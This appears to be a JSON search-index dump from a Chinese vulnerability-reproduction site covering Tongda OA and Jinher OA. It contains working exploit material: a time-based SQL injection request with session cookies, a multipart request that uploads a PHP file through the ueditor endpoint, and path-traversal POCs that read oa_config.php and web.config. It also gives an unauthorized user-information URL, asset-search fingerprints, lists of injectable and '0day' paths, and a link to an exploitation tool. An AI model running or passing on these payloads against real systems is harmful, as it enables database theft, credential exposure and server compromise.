","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通达OA v11.9 及以下版本中由于某些参数过滤不完善导致后台存在SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 通达OA \u003c= v11.9 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe 双击安装 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 漏洞文件位 webroot/general/appbuilder/modules/portal/controllers/WorkbenchController.php public function actionUpsharestatus() { Yii::$app-\u003eresponse-\u003eformat = yii\\web\\Response::FORMAT_JSON; $data = modules\\appdesign\\models\\AppUtils::toGBK($_POST); if (modules\\portal\\controllers\\intval($data[\"uid\"]) == $_SESSION[\"LOGIN_UID\"]) { modules\\portal\\models\\PortalWorkbench::updateAll(array(\"state\" =\u003e \"{$data[\"status\"]}\"), \"id={$data[\"id\"]}\"); } else if ($data[\"status\"] == 1) { modules\\portal\\models\\PortalWorkbenchState::deleteAll(array(\"wids\" =\u003e \"{$data[\"id\"]}\", \"uid\" =\u003e \"{$_SESSION[\"LOGIN_UID\"]}\")); } else { $Work = new modules\\portal\\models\\PortalWorkbenchState(); $Work-\u003ewids = $data[\"id\"]; $Work-\u003euid = $_SESSION[\"LOGIN_UID\"]; $Work-\u003esave(); } $dataBack = array(\"status\" =\u003e 1, \"msg\" =\u003e modules\\portal\\controllers\\_(\"操作成功\")); $dataBack = modules\\appdesign\\models\\AppUtils::toUTF8($dataBack); return $dataBack; } 其中 updateAll() 函数并没有使用防止 SQL注入的 sql_injection() 来防止注入 webroot/inc/conn.php 所以这里就出现了 id 参数存在注入的情况，请求包如下 POST /general/appbuilder/web/portal/workbench/upsharestatus HTTP/1.1 Host: oa.tongda2000.com Connection: close Content-Length: 36 Cache-Control: max-age=0 sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Origin: https://oa.tongda2000.com Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: https://oa.tongda2000.com/general/appbuilder/web/portal/workbench/upsharestatus Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: __root_domain_v=.tongda2000.com; SID_12=5ea03399; USER_NAME_COOKIE=chenqiang; Hm_lvt_7cbefde9059536a2b96aaafc134d625c=1617014067,1617196083; _qddaz=QD.677915359373668; PHPSESSID=nso4iqhvp2qi464eoavk2fn0c0; OA_USER_ID=chenqiang; SID_15=ded66d80; LAST_OPERATION_TIME=1617242241 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 uid=15\u0026status=1\u0026id=1;select sleep(4) 注意 uid参数 要为当前用户的uid才能完成请求，可以使用 burp 遍历查看时间响应 例如这里使用官网的测试账户 uid 遍历出为 15 如果uid错误则不会出现时间延迟，将请求包放入 Sqlmap跑一下 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v11.9-upsharestatus-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA v2014 get_contactlist.php 敏感信息泄漏漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2014-get_contactlist.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2014-get_contactlist.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通达OA v2014 get_contactlist.php文件存在信息泄漏漏洞，攻击者通过漏洞可以获取敏感信息，进一步攻击 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2014-get_contactlist.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2014-get_contactlist.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 通达OA v2014 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2014-get_contactlist.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2014-get_contactlist.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"TDXK-通达OA\" ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2014-get_contactlist.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2014-get_contactlist.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 版本信息 验证POC /mobile/inc/get_contactlist.php?P=1\u0026KWORD=%25\u0026isuser_info=3 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2014-get_contactlist.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2014-get_contactlist.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA v2017 action_upload.php 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2017-action_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2017-action_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通达OA v2017 action_upload.php 文件过滤不足且无需后台权限，导致任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2017-action_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2017-action_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 通达OA v2017 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2017-action_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2017-action_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"TDXK-通达OA\" ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2017-action_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2017-action_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问获取版本信息 发送请求包上传任意文件 POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 893 Content-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724 X_requested_with: XMLHttpRequest Accept-Encoding: gzip -----------------------------55719851240137822763221368724 Content-Disposition: form-data; name=\"CONFIG[fileFieldName]\" ffff -----------------------------55719851240137822763221368724 Content-Disposition: form-data; name=\"CONFIG[fileMaxSize]\" 1000000000 -----------------------------55719851240137822763221368724 Content-Disposition: form-data; name=\"CONFIG[filePathFormat]\" tcmd -----------------------------55719851240137822763221368724 Content-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\" .php -----------------------------55719851240137822763221368724 Content-Disposition: form-data; name=\"ffff\"; filename=\"test.php\" Content-Type: application/octet-stream \u003c?php phpinfo();?\u003e -----------------------------55719851240137822763221368724 Content-Disposition: form-data; name=\"mufile\" submit -----------------------------55719851240137822763221368724-- 再访问上传的文件 利用工具：https://github.com/Fu5r0dah/TongdaScan_go ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2017-action_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2017-action_upload.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA v2017 video_file.php 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2017-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2017-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 通达OA v2017 video_file.php文件存在任意文件下载漏洞，攻击者通过漏洞可以读取服务器敏感文件 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2017-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2017-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 通达OA v2017 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2017-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2017-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"TDXK-通达OA\" ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2017-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2017-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 验证POC /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/\u0026MEDIA_NAME=oa_config.php ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-v2017-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-v2017-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"通达OA 部分漏洞信息整合 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/:0:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/"},{"categories":null,"content":"通达OA信息收集 http[s]://TongDaOA.domain/inc/expired.php 判断通达版本 http[s]://TongDaOA.domain/inc/reg_trial.php http[s]://TongDaOA.domain/inc/reg_trial_submit.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php GET 参数username、email 可爆用户、邮箱 http[s]://TongDaOA.domain/resque/worker.php 计算机名 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/:1:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/"},{"categories":null,"content":"2013-2017(SQLi path) http[s]://TongDaOA.domain/module/crm2010/imageOperation/deleteImage.php http[s]://TongDaOA.domain/module/crm2010/product/type_tree.php http[s]://TongDaOA.domain/module/crm2010/select/getData.php http[s]://TongDaOA.domain/module/crm2010/select/getValue.php http[s]://TongDaOA.domain/module/crm2010/select/index.php http[s]://TongDaOA.domain/module/crm2010/share/update.php http[s]://TongDaOA.domain/portal/webportals/source/oa/news.php http[s]://TongDaOA.domain/portal/webportals/source/oa/notify.php?LOGIN_USER_ID= http[s]://TongDaOA.domain/task/crm/account_care_remind.php http[s]://TongDaOA.domain/task/crm/action_link_remind.php http[s]://TongDaOA.domain/task/crm/contract_birthday_remind.php http[s]://TongDaOA.domain/task/crm/contract_near_remind.php http[s]://TongDaOA.domain/task/crm/contract_remind.php http[s]://TongDaOA.domain/task/crm/crm_account_contact_bir_remind.php http[s]://TongDaOA.domain/task/crm/crm_complain_remind.php http[s]://TongDaOA.domain/task/crm/crm_opportunity_status_remind.php http[s]://TongDaOA.domain/task/crm/crm_salepay_remind.php http[s]://TongDaOA.domain/task/crm/crm_stockout_remind.php http[s]://TongDaOA.domain/task/crm/marketing_near_remind.php http[s]://TongDaOA.domain/task/crm/order_to_stockout_remind.php http[s]://TongDaOA.domain/task/crm/payment_near_remind.php http[s]://TongDaOA.domain/task/crm/storage_near_remind.php http[s]://TongDaOA.domain/ispirit/myoa.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/:2:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/"},{"categories":null,"content":"v11~v11.6 [0day] http[s]://TongDaOA.domain/general/approve_center/list/roll_config.inc.php http[s]://TongDaOA.domain/general/bi_design/reportshop/report_bi.func.php http[s]://TongDaOA.domain/general/data_center/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/design/report/action.php http[s]://TongDaOA.domain/general/reportshop/design/report/action.php http[s]://TongDaOA.domain/general/project/portal/details/budget/table.php http[s]://TongDaOA.domain/general/reportshop/design/report/console/autocode/autocode.php http[s]://TongDaOA.domain/general/reportshop/workshop/report/attachment-remark/form3.php http[s]://TongDaOA.domain/general/system/user/get_key_user_info.php http[s]://TongDaOA.domain/general/workflow/list/roll_config.inc.php http[s]://TongDaOA.domain/interface/GetNewAPP.php http[s]://TongDaOA.domain/interface/GetNewAPP1.php http[s]://TongDaOA.domain/general/workflow/plugin/turn/kd_k3_applly/kd_k3_applly.php http[s]://TongDaOA.domain/general/workflow/document_list/roll_config.inc.php ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/:3:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/"},{"categories":null,"content":"v11.6 [RCE] http[s]://TongDaOA.domain/module/appbuilder/assets/print.php 任意文件删除 ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/:4:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/"},{"categories":null,"content":"参考文章 通达OA漏洞一些漏洞点(Github) ","date":"0001-01-01","objectID":"/%E9%80%9A%E8%BE%BEoa-%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/:5:0","tags":null,"title":"","uri":"/%E9%80%9A%E8%BE%BEoa-%E9%83%A8%E5%88%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E6%95%B4%E5%90%88/"},{"categories":null,"content":"金和OA C6 DossierBaseInfoView.aspx 后台越权信息泄露漏洞 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-dossierbaseinfoview.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-dossierbaseinfoview.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 金和OA C6 存在越权信息泄露漏洞，普通用户登录后可以通过遍历ID编号获取管理员及其他用户的敏感信息 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-dossierbaseinfoview.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-dossierbaseinfoview.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 金和OA C6 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-dossierbaseinfoview.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-dossierbaseinfoview.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Jinher-OA\" ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-dossierbaseinfoview.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-dossierbaseinfoview.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 使用普通用户登录 OA应用后台 访问的POC为 http://xxx.xxx.xxx.xxx/C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1\u0026UserID=RY120330 注意 RY120330 需要为确定的其他的用户编号 泄露了部分的敏感信息 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-dossierbaseinfoview.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-dossierbaseinfoview.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"参考文章 https://mp.weixin.qq.com/s/gwHQVIZeMWfT8a5lBX_4WA ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-dossierbaseinfoview.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-dossierbaseinfoview.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"金和OA C6 download.jsp 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 金和OA C6 download.jsp文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 金和OA ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Jinher-OA\" ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 漏洞文件为 download.asp \u003c% Response.Buffer = true Response.Clear dim url Dim fso,fl,flsize dim Dname Dim objStream,ContentType,flName,isre,url1 '*********************************************调用时传入的下载文件名 Dname=trim(request(\"filename\")) '****************************************************************** If Dname\u003c\u003e\"\" Then '******************************下载文件存放的服务端目录 url=server.MapPath(Dname) 'url=server.MapPath(\"./\")\u0026\"\\Jhsoft.Web.module\\testbill\\dj\"\u0026Dname '这边做了一下改动By Fanshui '*************************************************** End If 'Response.write url 'response.end Set fso=Server.CreateObject(\"Scripting.FileSystemObject\") Set fl=fso.getfile(url) flsize=fl.size flName=fl.name Set fl=Nothing Set fso=Nothing 'Response.write flName 'Response.write flsize %\u003e \u003c% Set objStream = Server.CreateObject(\"ADODB.Stream\") 'objStream.Mode = 3 objStream.Type = 1 objStream.Open objStream.LoadFromFile url Select Case lcase(Right(flName, 4)) Case \".asf\" ContentType = \"video/x-ms-asf\" Case \".avi\" ContentType = \"video/avi\" Case \".doc\" ContentType = \"application/msword\" Case \".zip\" ContentType = \"application/zip\" Case \".xls\" ContentType = \"application/vnd.ms-excel\" Case \".gif\" ContentType = \"image/gif\" Case \".jpg\", \"jpeg\" ContentType = \"image/jpeg\" Case \".wav\" ContentType = \"audio/wav\" Case \".mp3\" ContentType = \"audio/mpeg3\" Case \".mpg\", \"mpeg\" ContentType = \"video/mpeg\" Case \".rtf\" ContentType = \"application/rtf\" Case \".htm\", \"html\" ContentType = \"text/html\" Case \".txt\" ContentType = \"text/plain\" Case Else ContentType = \"application/octet-stream\" End Select Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" \u0026 flName Response.AddHeader \"Content-Length\", flsize Response.Charset = \"UTF-8\" Response.ContentType = ContentType Response.BinaryWrite objStream.Read Response.Flush response.Clear() objStream.Close Set objStream = Nothing %\u003e 请求的POC为 /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config 读取 web.config /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"金和OA C6 OpenFile.aspx 后台越权敏感文件遍历漏洞 